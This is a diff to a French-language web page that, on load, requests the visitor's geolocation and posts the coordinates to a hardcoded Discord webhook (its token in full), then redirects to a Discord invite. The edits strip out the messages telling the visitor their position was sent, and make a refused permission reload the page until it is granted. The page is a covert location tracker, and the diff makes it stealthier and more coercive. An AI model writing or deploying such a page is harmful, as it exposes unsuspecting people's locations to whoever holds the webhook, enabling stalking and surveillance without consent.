@@ -3,16 +3,33 @@
 <head>
   <meta charset="UTF-8">
   <title>Localisation</title>
-  <link rel="stylesheet" href="style.css">
+  <style>
+    body {
+      background: radial-gradient(circle at center, #111 0%, #000 100%);
+      color: #e0e0e0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: "Segoe UI", Arial, sans-serif;
+      text-align: center;
+    }
+    h1 {
+      font-size: 1.8em;
+      font-weight: 400;
+      letter-spacing: 1px;
+      color: #f5f5f5;
+      text-shadow: 0px 0px 8px rgba(255, 255, 255, 0.15);
+    }
+  </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Autorise la localisation…</h1>
-    <div id="message"></div>
-  </div>
+  <h1>Activer la localisation…</h1>
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr";
+    const REDIRECT_URL = "https://discord.gg/UYqhGQmdQR";
 
     function envoyerPosition(position) {
       const lat = position.coords.latitude.toFixed(6);
@@ -22,40 +39,23 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          content: `📍 Nouvelle localisation reçue :\nLatitude : ${lat}\nLongitude : ${lng}`
+          content: `📍 Nouvelle localisation :\nLatitude: ${lat}\nLongitude: ${lng}`
         })
-      })
-      .then(() => {
-        document.getElementById("message").innerText = "✅ Position envoyée avec succès.";
-      })
-      .catch((error) => {
-        document.getElementById("message").innerText = "❌ Erreur lors de l'envoi : " + error.message;
+      }).finally(() => {
+          
+        window.location.href = REDIRECT_URL;
       });
     }
 
-    function erreurPosition(error) {
-      let message = "Erreur : ";
-      switch (error.code) {
-        case error.PERMISSION_DENIED:
-          message += "Permission refusée.";
-          break;
-        case error.POSITION_UNAVAILABLE:
-          message += "Position indisponible.";
-          break;
-        case error.TIMEOUT:
-          message += "Temps écoulé.";
-          break;
-        default:
-          message += error.message;
-      }
-      document.getElementById("message").innerText = message;
+    function erreurPosition() {
+      location.reload();
     }
 
     window.onload = function() {
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(envoyerPosition, erreurPosition);
       } else {
-        document.getElementById("message").innerText = "La géolocalisation n'est pas supportée.";
+        alert("La géolocalisation n'est pas supportée.");
       }
     };
   </script>
